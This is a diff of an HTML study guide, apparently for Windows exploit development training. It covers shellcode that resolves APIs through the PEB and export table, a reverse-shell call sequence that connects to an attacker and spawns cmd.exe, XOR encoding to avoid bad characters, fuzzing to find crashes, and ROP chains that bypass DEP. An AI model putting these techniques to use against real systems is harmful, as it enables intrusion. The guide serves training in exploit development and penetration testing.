 # Compare the base address with the PEB walk result</code></pre>
   </li>
@@ -2538,6 +2535,7 @@ next_module:
 <h3 id="pe-export-table">6.3 Parsing the PE Export Table</h3>
 
 <p>Once the base address of kernel32.dll is known, specific exported functions are located by parsing the Portable Executable (PE) export table. The PE header starts at the base address with an <code>IMAGE_DOS_HEADER</code>, whose <code>e_lfanew</code> field (offset 0x3C) points to the <code>IMAGE_NT_HEADERS</code>. The <code>OptionalHeader.DataDirectory[0]</code> (the export directory) provides an RVA to the <code>IMAGE_EXPORT_DIRECTORY</code> structure.</p>
+<figure><img src="./img/osed/fig068-find-function-logic.png" alt="Find function logic"></figure>
 
 <p>The export directory contains three parallel arrays: <code>AddressOfNames</code> (array of RVAs to function name strings), <code>AddressOfNameOrdinals</code> (array of 16-bit ordinal values), and <code>AddressOfFunctions</code> (array of RVAs to function entry points). To resolve a function by name: iterate through <code>AddressOfNames</code> comparing each string, note the index when a match is found, use that index into <code>AddressOfNameOrdinals</code> to get the ordinal, and use the ordinal as an index into <code>AddressOfFunctions</code> to get the function RVA.</p>
 
@@ -2585,7 +2583,7 @@ find_function_loop:
     mov eax, [edi+0x1c]        ; AddressOfFunctions RVA
     add eax, ebx              ; AddressOfFunctions VA
     mov eax, [eax+ecx*4]      ; function RVA
-    add eax, ebx              ; function VA — EAX now holds the function address</code></pre>
+    add eax, ebx              ; function VA - EAX now holds the function address</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Verify the PE parsing in WinDbg by comparing with the known export</label>
@@ -2688,7 +2686,7 @@ hash_done:
 <thead><tr><th>API Call</th><th>Parameters</th><th>Purpose</th></tr></thead>
 <tbody>
 <tr><td>WSAStartup</td><td>wVersionRequested=0x0202, lpWSAData=stack buffer</td><td>Initialize Winsock</td></tr>
-<tr><td>WSASocketA</td><td><code>af=AF_INET(2), type=SOCK_STREAM(1), protocol=0, dwFlags=0</code> plus default/null values for the remaining parameters</td><td>Create TCP socket</td></tr>
+<tr><td>WSASocketA</td><td>af=AF_INET(2), type=SOCK_STREAM(1), protocol=0, ..., dwFlags=0</td><td>Create TCP socket</td></tr>
 <tr><td>connect</td><td>s=socket, addr=sockaddr_in(IP,port), namelen=16</td><td>Connect to attacker</td></tr>
 <tr><td>CreateProcessA</td><td>lpCommandLine="cmd.exe", STARTUPINFO with redirected handles</td><td>Spawn shell with I/O over socket</td></tr>
 <tr><td>ExitProcess</td><td>uExitCode=0</td><td>Clean exit</td></tr>
@@ -2830,7 +2828,7 @@ mov al, 0x02           ; B0 02</code></pre>
     xor eax, eax
     push eax               ; null terminator on stack
     push 0x6578652e        ; ".exe"
-    push 0x646d63          ; "cmd" — but this has a leading null!
+    push 0x646d63          ; "cmd" - but this has a leading null!
 
 ; Better approach: use XOR or SUB to avoid the leading null
     xor eax, eax
@@ -2848,8 +2846,8 @@ mov al, 0x02           ; B0 02</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Handle IP addresses and port numbers that contain null bytes</label>
-    <pre><code class="language-c">; IP 192.168.1.1 = 0x0101A8C0 — contains no nulls, safe to push directly
-; IP 10.0.0.1 = 0x0100000A — contains three null bytes!
+    <pre><code class="language-c">; IP 192.168.1.1 = 0x0101A8C0 - contains no nulls, safe to push directly
+; IP 10.0.0.1 = 0x0100000A - contains three null bytes!
 
 ; Solution: XOR-encode the address and decode at runtime
     mov eax, 0x0100000a    ; target IP (contains nulls)
@@ -2906,7 +2904,7 @@ for key in range(1, 256):
         print(f"[+] Valid XOR key: 0x{key:02x}")
         break
 else:
-    print("[!] No single-byte XOR key avoids all bad chars — use multi-byte")</code></pre>
+    print("[!] No single-byte XOR key avoids all bad chars - use multi-byte")</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Encode the shellcode and generate the decoder stub</label>
@@ -2936,7 +2934,7 @@ print(decoder_stub)</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Write the XOR decoder stub in assembly</label>
-    <pre><code class="language-c">; XOR decoder stub — decodes payload in place, then falls through
+    <pre><code class="language-c">; XOR decoder stub - decodes payload in place, then falls through
     jmp short call_decoder
 decoder:
     pop esi               ; ESI = address of encoded shellcode (from CALL)
@@ -3003,7 +3001,7 @@ print(f'Bad chars: {found}' if found else f'Clean: {len(data)} bytes')
 #include &lt;windows.h&gt;
 
 unsigned char shellcode[] =
-    "\xcc"   // INT3 breakpoint for debugging — remove for production
+    "\xcc"   // INT3 breakpoint for debugging - remove for production
     // ... paste shellcode bytes here ...
     ;
 
@@ -3032,7 +3030,7 @@ i686-w64-mingw32-gcc -o harness.exe shellcode_harness.c -lws2_32 -Wl,--dynamicba
   </li>
   <li>
     <label><input type="checkbox"> Attach WinDbg and step through the shellcode</label>
-    <pre><code class="language-bash"># Run harness.exe — it will break at the INT3 (0xCC) instruction
+    <pre><code class="language-bash"># Run harness.exe - it will break at the INT3 (0xCC) instruction
 # In WinDbg:
 0:000> g                   ; run until INT3
 0:000> t                   ; single-step each instruction
@@ -3070,11 +3068,11 @@ pe_header = bytearray(open("template.exe", "rb").read())  # minimal PE template
 
 <h3 id="static-analysis">7.1 Static Analysis Methodology</h3>
 
-<p>Static analysis is the process of examining a compiled binary without executing it. In IDA Pro the first step is to load the target executable or DLL and let the auto-analysis engine complete. IDA identifies functions, cross-references, strings, and imported API calls. The goal is to map the attack surface — every path where external input enters the program — and follow it toward memory-manipulation operations that lack bounds checking.</p>
+<p>Static analysis is the process of examining a compiled binary without executing it. In IDA Pro the first step is to load the target executable or DLL and let the auto-analysis engine complete. IDA identifies functions, cross-references, strings, and imported API calls. The goal is to map the attack surface - every path where external input enters the program - and follow it toward memory-manipulation operations that lack bounds checking.</p>
 
 <p>Attack surface identification starts with imports. Network-facing applications import <code>recv</code>, <code>WSARecv</code>, or <code>ReadFile</code>; file parsers import <code>CreateFileA</code>/<code>ReadFile</code>; command handlers import string-processing functions. Each import is a potential entry point for attacker-controlled data. Cross-referencing these imports reveals which internal functions consume external input and where processing occurs.</p>
 
-<p>Synchronizing WinDbg and IDA Pro is essential for efficient reverse engineering. The target module's base address in WinDbg will differ from IDA's default image base. Use IDA's Edit → Segments → Rebase program to rebase the database to the actual load address from <code>lm m [module]</code> in WinDbg. Once rebased, every address in IDA matches WinDbg — breakpoints found during static analysis can be set directly. Hook the <code>recv</code> API with <code>bp ws2_32!recv</code> to intercept all incoming network data, then inspect the buffer on each break to trace exactly which function processes each field of the input.</p>
+<p>Synchronizing WinDbg and IDA Pro is essential for efficient reverse engineering. The target module's base address in WinDbg will differ from IDA's default image base. Use IDA's Edit → Segments → Rebase program to rebase the database to the actual load address from <code>lm m [module]</code> in WinDbg. Once rebased, every address in IDA matches WinDbg - breakpoints found during static analysis can be set directly. Hook the <code>recv</code> API with <code>bp ws2_32!recv</code> to intercept all incoming network data, then inspect the buffer on each break to trace exactly which function processes each field of the input.</p>
 
 <table class="custom-table">
 <thead><tr><th>Analysis Step</th><th>IDA Action</th><th>Purpose</th></tr></thead>
@@ -3097,7 +3095,7 @@ pe_header = bytearray(open("template.exe", "rb").read())  # minimal PE template
     <pre><code class="language-bash"># Launch IDA with the target binary
 ida.exe [target-binary].exe
 
-# Wait for the bottom status bar to show "AU: idle" — analysis complete</code></pre>
+# Wait for the bottom status bar to show "AU: idle" - analysis complete</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Rebase IDA to match the actual module base in WinDbg</label>
@@ -3116,7 +3114,7 @@ ida.exe [target-binary].exe
 0:000> g
 
 # When it breaks, examine the arguments:
-0:000> dd poi(esp+8) L10   # Buffer pointer — first 64 bytes of received data
+0:000> dd poi(esp+8) L10   # Buffer pointer - first 64 bytes of received data
 0:000> dd esp L4           # Stack: [ret] [socket] [buf] [len] [flags]</code></pre>
   </li>
     <li>
@@ -3157,7 +3155,7 @@ ida.exe [target-binary].exe
 
 <p>Certain C library functions are inherently unsafe because they perform no bounds checking on destination buffers. When attacker-controlled data reaches one of these functions, and the destination buffer is smaller than the input, a buffer overflow occurs. IDA makes it straightforward to search for these functions in the Imports window or by searching disassembly for <code>call</code> instructions referencing them.</p>
 
-<p>The distinction between dangerous and safe alternatives matters for determining exploitability. Functions like <code>strncpy</code>, <code>snprintf</code>, and <code>memcpy_s</code> accept a length parameter — but only if the developer supplies the correct size. A common mistake is passing the source length instead of the destination buffer size, which defeats the bounds check entirely.</p>
+<p>The distinction between dangerous and safe alternatives matters for determining exploitability. Functions like <code>strncpy</code>, <code>snprintf</code>, and <code>memcpy_s</code> accept a length parameter - but only if the developer supplies the correct size. A common mistake is passing the source length instead of the destination buffer size, which defeats the bounds check entirely.</p>
 
 <table class="custom-table">
 <thead><tr><th>Dangerous Function</th><th>Safe Alternative</th><th>Vulnerability Type</th></tr></thead>
@@ -3195,8 +3193,8 @@ ida.exe [target-binary].exe
   <li>
     <label><input type="checkbox"> Search disassembly for inline dangerous function calls that bypass imports</label>
     <ul class="methodology-checklist">
-    <li><label><input type="checkbox"> Search → Text (Alt+T): "rep movs" — inline memcpy</label></li>
-    <li><label><input type="checkbox"> Search for: "rep stos" — inline memset patterns</label></li>
+    <li><label><input type="checkbox"> Search → Text (Alt+T): "rep movs" - inline memcpy</label></li>
+    <li><label><input type="checkbox"> Search for: "rep stos" - inline memset patterns</label></li>
     <li><label><input type="checkbox"> These are compiler-inlined and do not appear in imports</label></li>
     </ul>
   </li>
@@ -3204,7 +3202,7 @@ ida.exe [target-binary].exe
     <label><input type="checkbox"> For each call site, check whether the source argument is attacker-controlled</label>
     <ul class="methodology-checklist">
     <li><label><input type="checkbox"> At the strcpy call site, trace the source (second argument):</label></li>
-    <li><label><input type="checkbox"> push  eax          ; src — where does EAX come from?</label></li>
+    <li><label><input type="checkbox"> push  eax          ; src - where does EAX come from?</label></li>
     <li><label><input type="checkbox"> lea   ecx, [ebp-208h]</label></li>
     <li><label><input type="checkbox"> push  ecx          ; dst</label></li>
     <li><label><input type="checkbox"> call  strcpy</label></li>
@@ -3215,8 +3213,8 @@ ida.exe [target-binary].exe
     <label><input type="checkbox"> Verify that no length check exists between input and dangerous call</label>
     <ul class="methodology-checklist">
     <li><label><input type="checkbox"> In the graph view, look for:</label></li>
-    <li><label><input type="checkbox"> cmp [length], [max]    — bounds check</label></li>
-    <li><label><input type="checkbox"> ja  skip_copy          — conditional skip</label></li>
+    <li><label><input type="checkbox"> cmp [length], [max]    - bounds check</label></li>
+    <li><label><input type="checkbox"> ja  skip_copy          - conditional skip</label></li>
     <li><label><input type="checkbox"> If no such check exists before the call, the overflow is reachable</label></li>
     </ul>
   </li>
@@ -3224,9 +3222,9 @@ ida.exe [target-binary].exe
 
 <h3 id="input-tracing">7.3 Tracing Input to Vulnerable Sinks</h3>
 
-<p>A vulnerability is only exploitable if attacker-controlled data can reach it. Input tracing starts at a source — typically <code>recv</code> or <code>ReadFile</code> — and follows the data through every function call, buffer copy, and transformation until it arrives at a dangerous sink. This is data-flow analysis. Each intermediate function must be examined to determine whether it truncates, filters, or transforms the input in ways that limit exploitation.</p>
+<p>A vulnerability is only exploitable if attacker-controlled data can reach it. Input tracing starts at a source - typically <code>recv</code> or <code>ReadFile</code> - and follows the data through every function call, buffer copy, and transformation until it arrives at a dangerous sink. This is data-flow analysis. Each intermediate function must be examined to determine whether it truncates, filters, or transforms the input in ways that limit exploitation.</p>
 
-<p>Data often passes through multiple layers before reaching a vulnerable function. A network server might call <code>recv</code> into a raw buffer, then parse the buffer into a protocol structure, then extract a field and pass it to a processing function that calls <code>strcpy</code>. Each layer is an opportunity for bounds checking — and each layer without a check is a link in the exploit chain.</p>
+<p>Data often passes through multiple layers before reaching a vulnerable function. A network server might call <code>recv</code> into a raw buffer, then parse the buffer into a protocol structure, then extract a field and pass it to a processing function that calls <code>strcpy</code>. Each layer is an opportunity for bounds checking - and each layer without a check is a link in the exploit chain.</p>
 
 <table class="custom-table">
 <thead><tr><th>Trace Step</th><th>What to Check</th><th>Exploit Impact</th></tr></thead>
@@ -3248,7 +3246,7 @@ ida.exe [target-binary].exe
     <li><label><input type="checkbox"> push 0          ; flags</label></li>
     <li><label><input type="checkbox"> push 1000h      ; len (max 4096 bytes)</label></li>
     <li><label><input type="checkbox"> lea  eax, [ebp-1004h]</label></li>
-    <li><label><input type="checkbox"> push eax        ; buf — stack buffer at ebp-0x1004</label></li>
+    <li><label><input type="checkbox"> push eax        ; buf - stack buffer at ebp-0x1004</label></li>
     <li><label><input type="checkbox"> push [ebp+sock]</label></li>
     <li><label><input type="checkbox"> call recv</label></li>
     <li><label><input type="checkbox"> The buffer is at ebp-0x1004, max 4096 bytes of input</label></li>
@@ -3288,18 +3286,18 @@ ida.exe [target-binary].exe
 
 <h3 id="stack-frame-analysis">7.4 Stack Frame Analysis in IDA</h3>
 
-<p>IDA reconstructs the stack frame of each function by analyzing <code>sub esp</code>, <code>push</code>, and <code>mov [ebp-X]</code> instructions. Double-clicking a function's stack frame (or pressing Ctrl+K) opens the Stack Variables view, which lists every local variable, its offset from EBP, and its size. The offset tells you how far each variable is from the saved return address — the critical distance for calculating overflow padding.</p>
+<p>IDA reconstructs the stack frame of each function by analyzing <code>sub esp</code>, <code>push</code>, and <code>mov [ebp-X]</code> instructions. Double-clicking a function's stack frame (or pressing Ctrl+K) opens the Stack Variables view, which lists every local variable, its offset from EBP, and its size. The offset tells you how far each variable is from the saved return address - the critical distance for calculating overflow padding.</p>
 
 <p>IDA names stack variables automatically. A variable at <code>[ebp-208h]</code> appears as <code>var_208</code>. The size of a buffer is inferred from the gap between consecutive variables: if <code>var_208</code> is followed by <code>var_108</code>, the buffer is 0x208 - 0x108 = 0x100 (256) bytes. The saved return address is at <code>[ebp+4]</code>, so the total overflow distance from <code>var_208</code> to EIP is 0x208 + 4 = 524 bytes.</p>
 
 <table class="custom-table">
 <thead><tr><th>Stack Layout Element</th><th>EBP Offset</th><th>Notes</th></tr></thead>
 <tbody>
-<tr><td>Local buffer (var_208)</td><td>[ebp-208h]</td><td>Lowest address — overflow starts here</td></tr>
+<tr><td>Local buffer (var_208)</td><td>[ebp-208h]</td><td>Lowest address - overflow starts here</td></tr>
 <tr><td>Other locals (var_108)</td><td>[ebp-108h]</td><td>Overwritten during overflow</td></tr>
-<tr><td>Saved EBP</td><td>[ebp+0]</td><td>Previous frame pointer — overwritten</td></tr>
-<tr><td>Saved EIP (return address)</td><td>[ebp+4]</td><td>Primary target — hijack control flow</td></tr>
-<tr><td>Function arguments</td><td><code>[ebp+8]</code>, <code>[ebp+Ch]</code>, and higher positive offsets</td><td>Caller's arguments — may also be overwritten</td></tr>
+<tr><td>Saved EBP</td><td>[ebp+0]</td><td>Previous frame pointer - overwritten</td></tr>
+<tr><td>Saved EIP (return address)</td><td>[ebp+4]</td><td>Primary target - hijack control flow</td></tr>
+<tr><td>Function arguments</td><td>[ebp+8], [ebp+Ch], ...</td><td>Caller's arguments - may also be overwritten</td></tr>
 </tbody>
 </table>
 
@@ -3349,8 +3347,9 @@ padding += 4      # saved EBP itself</code></pre>
 <h3 id="dynamic-analysis-windbg">7.5 Dynamic Analysis with WinDbg</h3>
 
 <p>Dynamic analysis validates the findings from static analysis by running the target binary under a debugger and sending crafted input. Set breakpoints on the dangerous function calls identified during static analysis, send input that should trigger the overflow, and observe the register and stack state when the breakpoint hits. This confirms the overflow distance and reveals any runtime protections not visible in the static binary.</p>
+<figure><img src="./img/osed/fig119-illustration-of-a-stack-buffer-overflow-due-to-a-copy-operat.png" alt="Illustration of a stack buffer overflow due to a copy operation"></figure>
 
-<p>Comparing the actual overflow behavior against the static analysis prediction catches discrepancies — stack cookies (GS) that were not detected statically, ASLR on modules that appeared to have fixed base addresses, or input transformations that truncate the overflow before it reaches the return address.</p>
+<p>Comparing the actual overflow behavior against the static analysis prediction catches discrepancies - stack cookies (GS) that were not detected statically, ASLR on modules that appeared to have fixed base addresses, or input transformations that truncate the overflow before it reaches the return address.</p>
 
 <table class="custom-table">
 <thead><tr><th>Verification Step</th><th>WinDbg Command</th><th>Expected Result</th></tr></thead>
@@ -3418,7 +3417,7 @@ da poi(esp+4)
 g
 
 # When access violation occurs:
-r                    # Show all registers — check EIP value
+r                    # Show all registers - check EIP value
 !exchain             # Show SEH chain (if SEH exploit)
 dd esp L20           # Examine stack around crash point
 db eip               # Verify EIP points to our pattern</code></pre>
@@ -3437,11 +3436,11 @@ db eip               # Verify EIP points to our pattern</code></pre>
 
 <h3 id="protocol-fuzzing">7.6 Protocol Analysis and Fuzzing</h3>
 
-<p>Many EXP-301 targets implement custom network protocols. Protocol analysis means capturing traffic (with Wireshark or by reading the binary's parsing code in IDA) and identifying the message format: header fields, length fields, command identifiers, and data payloads. Once the protocol structure is understood, a fuzzer can systematically send malformed messages that violate expected constraints — oversized fields, missing delimiters, negative lengths, and unexpected command codes.</p>
+<p>Many EXP-301 targets implement custom network protocols. Protocol analysis means capturing traffic (with Wireshark or by reading the binary's parsing code in IDA) and identifying the message format: header fields, length fields, command identifiers, and data payloads. Once the protocol structure is understood, a fuzzer can systematically send malformed messages that violate expected constraints - oversized fields, missing delimiters, negative lengths, and unexpected command codes.</p>
 
 <p>Targeted fuzzing is more effective than blind fuzzing. Instead of randomly mutating bytes, the fuzzer should exercise specific code paths identified during static analysis. For each input field that reaches a dangerous function, the fuzzer generates inputs designed to overflow that specific buffer while keeping the rest of the protocol structure valid so the parser does not reject the message before it reaches the vulnerable code.</p>
 
-<p>Some protocols include a checksum or hash field that the server validates before processing the payload. If the checksum is wrong, the server discards the packet and the overflow is never reached. During reverse engineering, identify the checksum algorithm in IDA — common implementations include CRC32, simple byte sums, XOR folding, or custom hash functions. Once identified, implement the same algorithm in the exploit script so that every crafted packet passes validation and reaches the vulnerable code path.</p>
+<p>Some protocols include a checksum or hash field that the server validates before processing the payload. If the checksum is wrong, the server discards the packet and the overflow is never reached. During reverse engineering, identify the checksum algorithm in IDA - common implementations include CRC32, simple byte sums, XOR folding, or custom hash functions. Once identified, implement the same algorithm in the exploit script so that every crafted packet passes validation and reaches the vulnerable code path.</p>
 
 <table class="custom-table">
 <thead><tr><th>Protocol Element</th><th>Fuzz Strategy</th><th>Expected Result</th></tr></thead>
@@ -3506,7 +3505,7 @@ def send_payload(data_field):
 for size in range(100, 5000, 100):
     payload = b"A" * size
     alive = send_payload(payload)
-    print(f"[*] Sent {size} bytes — {'alive' if alive else 'CRASHED'}")
+    print(f"[*] Sent {size} bytes - {'alive' if alive else 'CRASHED'}")
     if not alive:
         print(f"[!] Crash at {size} bytes")
         break
@@ -3541,7 +3540,7 @@ def send_payload(data_field):
 for size in range(1900, 2001, 10):
     payload = b"A" * size
     alive = send_payload(payload)
-    print(f"[*] {size} bytes — {'alive' if alive else 'CRASHED'}")
+    print(f"[*] {size} bytes - {'alive' if alive else 'CRASHED'}")
     if not alive:
         break</code></pre>
   </li>
@@ -3549,9 +3548,9 @@ for size in range(1900, 2001, 10):
 
 <h3 id="vuln-classification">7.7 Vulnerability Classification</h3>
 
-<p>After identifying a crash, classify the vulnerability to determine the appropriate exploitation technique. A stack buffer overflow with EIP control is the most straightforward — it leads directly to Module 2 (basic overflow) or Module 8 (DEP bypass). An SEH overwrite requires the Module 3 technique. Format string vulnerabilities require Module 10/11 techniques. Integer overflows that lead to heap corruption are generally not exploitable within the EXP-301 scope but should be noted.</p>
+<p>After identifying a crash, classify the vulnerability to determine the appropriate exploitation technique. A stack buffer overflow with EIP control is the most straightforward - it leads directly to Module 2 (basic overflow) or Module 8 (DEP bypass). An SEH overwrite requires the Module 3 technique. Format string vulnerabilities require Module 10/11 techniques. Integer overflows that lead to heap corruption are generally not exploitable within the EXP-301 scope but should be noted.</p>
 
-<p>Mitigation assessment determines which bypass techniques are needed. Check for DEP (NX bit), ASLR, stack cookies (GS), SafeSEH, and SEHOP. Each mitigation narrows the exploitation path but does not make the vulnerability unexploitable — it changes which module's technique applies.</p>
+<p>Mitigation assessment determines which bypass techniques are needed. Check for DEP (NX bit), ASLR, stack cookies (GS), SafeSEH, and SEHOP. Each mitigation narrows the exploitation path but does not make the vulnerability unexploitable - it changes which module's technique applies.</p>
 
 <table class="custom-table">
 <thead><tr><th>Crash Indicator</th><th>Vulnerability Type</th><th>Exploitation Module</th></tr></thead>
@@ -3569,8 +3568,8 @@ for size in range(1900, 2001, 10):
   <li>
     <label><input type="checkbox"> Examine the crash state to classify the vulnerability</label>
     <pre><code class="language-bash"># In WinDbg after the crash:
-r                    # Check EIP — is it our pattern?
-!exchain             # Check SEH chain — is the handler overwritten?
+r                    # Check EIP - is it our pattern?
+!exchain             # Check SEH chain - is the handler overwritten?
 !analyze -v          # Detailed crash analysis
 .ecxr                # Switch to exception context if needed</code></pre>
   </li>
@@ -3606,7 +3605,7 @@ wmic OS Get DataExecutionPrevention_SupportPolicy</code></pre>
     <li><label><input type="checkbox"> mov ecx, [ebp-4]</label></li>
     <li><label><input type="checkbox"> xor ecx, ebp</label></li>
     <li><label><input type="checkbox"> call __security_check_cookie</label></li>
-    <li><label><input type="checkbox"> If present, direct EIP overwrite is blocked — use SEH technique</label></li>
+    <li><label><input type="checkbox"> If present, direct EIP overwrite is blocked - use SEH technique</label></li>
     </ul>
   </li>
   <li>
@@ -3629,7 +3628,7 @@ wmic OS Get DataExecutionPrevention_SupportPolicy</code></pre>
 
 <h3 id="dep-theory">8.1 Data Execution Prevention Theory</h3>
 
-<p>Data Execution Prevention (DEP) marks memory pages as either executable or writable, but not both simultaneously. The hardware implementation uses the NX (No eXecute) bit in the page table entry — when the CPU attempts to execute code on a page marked NX, it raises an access violation. This defeats traditional shellcode execution on the stack because the stack is mapped as read/write but not executable.</p>
+<p>Data Execution Prevention (DEP) marks memory pages as either executable or writable, but not both simultaneously. The hardware implementation uses the NX (No eXecute) bit in the page table entry - when the CPU attempts to execute code on a page marked NX, it raises an access violation. This defeats traditional shellcode execution on the stack because the stack is mapped as read/write but not executable.</p>
 
 <p>Windows implements DEP in four modes. OptIn (default on client OS) only protects processes that explicitly opt in. OptOut (default on server OS) protects all processes except those explicitly exempted. AlwaysOn and AlwaysOff are self-explanatory. Process-level DEP can also be set via the <code>/NXCOMPAT</code> linker flag, which sets a flag in the PE header requesting DEP protection regardless of the system policy.</p>
 
@@ -3685,7 +3684,7 @@ bcdedit /enum | findstr "nx"</code></pre>
     <pre><code class="language-bash">!vprot [module-base]+1000</code></pre>
     <ul class="methodology-checklist">
     <li><label><input type="checkbox"> Check memory protection on a module's code section:</label></li>
-    <li><label><input type="checkbox"> Should show: PAGE_EXECUTE_READ — code sections remain executable</label></li>
+    <li><label><input type="checkbox"> Should show: PAGE_EXECUTE_READ - code sections remain executable</label></li>
     <li><label><input type="checkbox"> This is the basis for ROP: reuse existing executable code</label></li>
     </ul>
   </li>
@@ -3693,7 +3692,8 @@ bcdedit /enum | findstr "nx"</code></pre>
 
 <h3 id="rop-concepts">8.2 Return-Oriented Programming Concepts</h3>
 
-<p>Return-Oriented Programming (ROP) bypasses DEP by chaining small sequences of existing executable instructions — called gadgets — that each end with a <code>RET</code> instruction. Instead of injecting new code, the exploit arranges the stack so that each <code>RET</code> pops the next gadget address, effectively building a program from fragments of legitimate code already in memory.</p>
+<p>Return-Oriented Programming (ROP) bypasses DEP by chaining small sequences of existing executable instructions - called gadgets - that each end with a <code>RET</code> instruction. Instead of injecting new code, the exploit arranges the stack so that each <code>RET</code> pops the next gadget address, effectively building a program from fragments of legitimate code already in memory.</p>
+<figure><img src="./img/osed/fig136-gadgets-that-allow-write-of-arbitrary-content-to-memory.png" alt="Gadgets that allow write of arbitrary content to memory"></figure>
 
 <p>The stack controls execution entirely. Each gadget performs a small operation (load a register, add values, push a value) and then executes <code>RET</code>, which pops the next address from the stack and jumps to it. By carefully sequencing gadgets and their arguments on the stack, the chain can call a Windows API function like <code>VirtualProtect</code> to mark the stack as executable, then return to shellcode that now sits in executable memory.</p>
 
@@ -3701,7 +3701,7 @@ bcdedit /enum | findstr "nx"</code></pre>
 <thead><tr><th>Concept</th><th>Description</th><th>Example</th></tr></thead>
 <tbody>
 <tr><td>Gadget</td><td>Short instruction sequence ending in RET</td><td><code>pop eax; ret</code></td></tr>
-<tr><td>Chain</td><td>Sequence of gadget addresses on the stack</td><td><code>addr1, arg1, addr2, arg2</code>, then additional gadget/argument pairs as needed</td></tr>
+<tr><td>Chain</td><td>Sequence of gadget addresses on the stack</td><td>addr1, arg1, addr2, arg2, ...</td></tr>
 <tr><td>Stack pivot</td><td>Move ESP to attacker-controlled memory</td><td><code>xchg eax, esp; ret</code></td></tr>
 <tr><td>API call via ROP</td><td>Set up parameters and call Win32 API</td><td>VirtualProtect(addr, size, 0x40, &old)</td></tr>
 <tr><td>RET sled</td><td>Series of RET gadgets to align execution</td><td>Fills gaps in the chain</td></tr>
@@ -3712,30 +3712,28 @@ bcdedit /enum | findstr "nx"</code></pre>
 <ul class="methodology-checklist">
   <li>
     <label><input type="checkbox"> Understand the stack layout during ROP chain execution</label>
-    <ul class="methodology-checklist">
-    <li><label><input type="checkbox"> Stack layout after EIP overwrite:</label></li>
-    <li><label><input type="checkbox"> <code>ESP -&gt; [gadget_1 address]</code> - the first <code>RET</code> jumps here</label></li>
-    <li><label><input type="checkbox"> <code>[gadget_1 argument]</code> - consumed by <code>gadget_1</code>, for example through a <code>POP</code></label></li>
-    <li><label><input type="checkbox"> <code>[gadget_2 address]</code> - <code>gadget_1</code>'s <code>RET</code> jumps here</label></li>
-    <li><label><input type="checkbox"> <code>[gadget_2 argument]</code></label></li>
-    <li><label><input type="checkbox"> <code>[gadget_3 address]</code></label></li>
-    <li><label><input type="checkbox"> Additional gadget addresses and arguments may appear here depending on the chain</label></li>
-    <li><label><input type="checkbox"> <code>[VirtualProtect addr]</code></label></li>
-    <li><label><input type="checkbox"> <code>[shellcode return]</code></label></li>
-    <li><label><input type="checkbox"> <code>[VP arg1: lpAddress]</code></label></li>
-    <li><label><input type="checkbox"> <code>[VP arg2: dwSize]</code></label></li>
-    <li><label><input type="checkbox"> <code>[VP arg3: flNewProtect = 0x40]</code></label></li>
-    <li><label><input type="checkbox"> <code>[VP arg4: lpflOldProtect]</code></label></li>
-    <li><label><input type="checkbox"> <code>[shellcode bytes follow]</code></label></li>
-    </ul>
+    <pre><code class="language-text">Stack layout after EIP overwrite:
+ESP -> [gadget_1 address]   ; RET jumps here
+       [gadget_1 argument]  ; gadget_1 pops this into a register
+       [gadget_2 address]   ; gadget_1's RET jumps here
+       [gadget_2 argument]
+       [gadget_3 address]
+       [additional gadgets and arguments]
+       [VirtualProtect addr]
+       [shellcode return]
+       [VP arg1: lpAddress]
+       [VP arg2: dwSize]
+       [VP arg3: flNewProtect = 0x40]
+       [VP arg4: lpflOldProtect]
+       [shellcode bytes]</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Identify the target API call for the ROP chain</label>
     <ul class="methodology-checklist">
     <li><label><input type="checkbox"> Three main approaches:</label></li>
-    <li><label><input type="checkbox"> 1. VirtualProtect — change stack page to PAGE_EXECUTE_READWRITE</label></li>
-    <li><label><input type="checkbox"> 2. VirtualAlloc  — allocate new RWX memory, copy shellcode there</label></li>
-    <li><label><input type="checkbox"> 3. WriteProcessMemory — write shellcode to existing executable section</label></li>
+    <li><label><input type="checkbox"> 1. VirtualProtect - change stack page to PAGE_EXECUTE_READWRITE</label></li>
+    <li><label><input type="checkbox"> 2. VirtualAlloc  - allocate new RWX memory, copy shellcode there</label></li>
+    <li><label><input type="checkbox"> 3. WriteProcessMemory - write shellcode to existing executable section</label></li>
     <li><label><input type="checkbox"> VirtualProtect is the most common and simplest approach</label></li>
     </ul>
   </li>
@@ -3756,9 +3754,9 @@ bcdedit /enum | findstr "nx"</code></pre>
 
 <p>Gadgets must come from modules that are not protected by ASLR and do not have their base address randomized on each load. Use <code>!mona modules</code> to list all loaded modules and their protection flags. The ideal gadget source has ASLR=False, Rebase=False, SafeSEH=N/A, and NXCompat=False. The module's own code section is PAGE_EXECUTE_READ, so gadgets within it are always executable.</p>
 
-<p>Gadget quality matters. A "clean" gadget performs exactly one useful operation and returns. A "dirty" gadget has side effects — it may modify other registers, dereference pointers, or include instructions that cause a crash if register values are not properly set. Prefer clean gadgets, but dirty gadgets can be used if their side effects are neutralized by arranging appropriate values on the stack or in registers.</p>
+<p>Gadget quality matters. A "clean" gadget performs exactly one useful operation and returns. A "dirty" gadget has side effects - it may modify other registers, dereference pointers, or include instructions that cause a crash if register values are not properly set. Prefer clean gadgets, but dirty gadgets can be used if their side effects are neutralized by arranging appropriate values on the stack or in registers.</p>
 
-<p>Pykd is a WinDbg Python scripting extension that enables programmatic gadget discovery and analysis directly from the debugger. After loading Pykd with <code>.load pykd</code>, Python scripts run inside WinDbg with full access to the debug engine — enumerating modules, reading memory, searching for byte patterns, and filtering results. This is useful for automated gadget searches across multiple modules and for building custom analysis tools that complement mona.py and rp++.</p>
+<p>Pykd is a WinDbg Python scripting extension that enables programmatic gadget discovery and analysis directly from the debugger. After loading Pykd with <code>.load pykd</code>, Python scripts run inside WinDbg with full access to the debug engine - enumerating modules, reading memory, searching for byte patterns, and filtering results. This is useful for automated gadget searches across multiple modules and for building custom analysis tools that complement mona.py and rp++.</p>
 
 <table class="custom-table">
 <thead><tr><th>Tool</th><th>Command</th><th>Output</th></tr></thead>
@@ -3792,9 +3790,9 @@ bcdedit /enum | findstr "nx"</code></pre>
     <ul class="methodology-checklist">
     <li><label><input type="checkbox"> Generate all ROP gadgets from the target module:</label></li>
     <li><label><input type="checkbox"> Output files are written to the mona working directory:</label></li>
-    <li><label><input type="checkbox"> rop.txt           — all individual gadgets</label></li>
-    <li><label><input type="checkbox"> rop_chains.txt    — pre-built API call chains</label></li>
